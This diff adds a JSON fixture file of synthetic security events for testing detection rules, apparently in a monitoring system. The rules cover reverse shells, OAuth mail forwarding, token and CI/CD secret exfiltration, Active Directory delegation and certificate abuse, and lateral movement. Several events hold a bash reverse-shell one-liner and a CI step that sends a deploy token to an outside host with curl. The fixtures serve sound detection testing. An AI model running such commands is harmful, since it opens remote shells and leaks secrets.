@@ -1,0 +1,316 @@
+{
+  "fixtures": [
+    {
+      "rule": "attempt.reverse-shell.request",
+      "events": [
+        {
+          "event.category": "security",
+          "event.action": "http_request",
+          "event.outcome": "blocked",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "http.request.method": "POST",
+          "http.request.body.command": "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"
+        }
+      ],
+      "level": 5
+    },
+    {
+      "rule": "attempt.reverse-shell.process",
+      "events": [
+        {
+          "event.category": "security",
+          "event.action": "process_start",
+          "event.outcome": "unknown",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "process.command_line": "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"
+        }
+      ],
+      "level": 5
+    },
+    {
+      "rule": "chain.oauth.grant-mail",
+      "events": [
+        {
+          "event.category": "security",
+          "event.action": "oauth_consent",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "application.id": "app-1",
+          "oauth.grant.id": "grant-1",
+          "oauth.scope": "Mail.ReadWrite"
+        },
+        {
+          "event.category": "security",
+          "event.action": "mail_rule_create",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "application.id": "app-1",
+          "oauth.grant.id": "grant-1",
+          "mail.forward.external": true,
+          "mail.rule.hide": true
+        }
+      ],
+      "level": 4
+    },
+    {
+      "rule": "chain.oauth.token-exfil",
+      "events": [
+        {
+          "event.category": "security",
+          "event.action": "object_read",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "application.id": "a",
+          "token.id": "t",
+          "resource.id": "object-1",
+          "data.classification": "sensitive"
+        },
+        {
+          "event.category": "security",
+          "event.action": "object_transfer",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "application.id": "a",
+          "token.id": "t",
+          "resource.id": "object-1",
+          "network.direction": "outbound",
+          "destination.external": true
+        }
+      ],
+      "level": 4
+    },
+    {
+      "rule": "chain.cicd.secret-transfer",
+      "events": [
+        {
+          "event.category": "security",
+          "event.action": "workflow_change",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "repository.id": "repo-1",
+          "pipeline.run.id": "run-1",
+          "git.commit.id": "sha-1",
+          "secret.id": "deploy",
+          "workflow.diff": "curl --data ${{ secrets.DEPLOY_TOKEN }} https://collector.invalid"
+        },
+        {
+          "event.category": "security",
+          "event.action": "secret_access",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "repository.id": "repo-1",
+          "pipeline.run.id": "run-1",
+          "git.commit.id": "sha-1",
+          "secret.id": "deploy"
+        },
+        {
+          "event.category": "security",
+          "event.action": "secret_transfer",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "repository.id": "repo-1",
+          "pipeline.run.id": "run-1",
+          "git.commit.id": "sha-1",
+          "secret.id": "deploy",
+          "destination.external": true,
+          "network.direction": "outbound"
+        }
+      ],
+      "level": 4
+    },
+    {
+      "rule": "chain.cicd.publish-token",
+      "events": [
+        {
+          "event.category": "security",
+          "event.action": "repository_protection_disable",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "repository.id": "r",
+          "token.id": "t"
+        },
+        {
+          "event.category": "security",
+          "event.action": "package_publish",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "repository.id": "r",
+          "token.id": "t",
+          "artifact.attestation.mismatch": true
+        }
+      ],
+      "level": 4
+    },
+    {
+      "rule": "chain.ad.rbcd-use",
+      "events": [
+        {
+          "event.category": "security",
+          "event.action": "directory_change",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "AttributeLDAPDisplayName": "msDS-AllowedToActOnBehalfOfOtherIdentity",
+          "delegation.operation": "add",
+          "delegation.beneficiary.sid": "S-1-5-21-100",
+          "delegation.resource_spn": "cifs/target"
+        },
+        {
+          "event.category": "security",
+          "event.action": "service_ticket",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "kerberos.delegated": true,
+          "delegation.delegator.sid": "S-1-5-21-100",
+          "delegation.resource_spn": "cifs/target"
+        }
+      ],
+      "level": 4
+    },
+    {
+      "rule": "chain.ad.certificate-auth",
+      "events": [
+        {
+          "event.category": "security",
+          "event.action": "certificate_issue",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "certificate.thumbprint": "ABCDEF0123",
+          "certificate.issuer": "CA-a",
+          "certificate.subject.upn": "admin@domain",
+          "certificate.requester.upn": "user@domain"
+        },
+        {
+          "event.category": "security",
+          "event.action": "auth_success",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "certificate.thumbprint": "ABCDEF0123",
+          "certificate.issuer": "CA-a",
+          "authentication.method": "certificate"
+        }
+      ],
+      "level": 4
+    },
+    {
+      "rule": "chain.ad.shadow-key-auth",
+      "events": [
+        {
+          "event.category": "security",
+          "event.action": "directory_change",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "AttributeLDAPDisplayName": "msDS-KeyCredentialLink",
+          "key.operation": "add",
+          "key.id": "key-1",
+          "target.id": "user-1"
+        },
+        {
+          "event.category": "security",
+          "event.action": "auth_success",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "authentication.method": "keytrust",
+          "key.id": "key-1",
+          "target.id": "user-1"
+        }
+      ],
+      "level": 4
+    },
+    {
+      "rule": "chain.lateral.windows",
+      "events": [
+        {
+          "event.category": "security",
+          "event.action": "auth_success",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "logon.id": "0x123",
+          "source.ip": "192.0.2.30",
+          "user.id": "SID-user",
+          "artifact.sha256": "abc123",
+          "LogonType": "3"
+        },
+        {
+          "event.category": "security",
+          "event.action": "file_create",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "logon.id": "0x123",
+          "source.ip": "192.0.2.30",
+          "user.id": "SID-user",
+          "artifact.sha256": "abc123",
+          "share.name": "ADMIN$"
+        },
+        {
+          "event.category": "security",
+          "event.action": "process_start",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "logon.id": "0x123",
+          "source.ip": "192.0.2.30",
+          "user.id": "SID-user",
+          "artifact.sha256": "abc123",
+          "process.command_line": "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"
+        }
+      ],
+      "level": 5
+    },
+    {
+      "rule": "chain.lateral.ssh",
+      "events": [
+        {
+          "event.category": "security",
+          "event.action": "auth_success",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "ssh.session.id": "ssh-1",
+          "user.id": "u",
+          "service.name": "sshd"
+        },
+        {
+          "event.category": "security",
+          "event.action": "file_create",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "ssh.session.id": "ssh-1",
+          "user.id": "u",
+          "artifact.sha256": "abc"
+        },
+        {
+          "event.category": "security",
+          "event.action": "process_start",
+          "event.outcome": "success",
+          "organization.id": "tenant-a",
+          "host.name": "server-a",
+          "ssh.session.id": "ssh-1",
+          "user.id": "u",
+          "artifact.sha256": "abc",
+          "process.command_line": "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"
+        }
+      ],
+      "level": 5
+    }
+  ]
+}
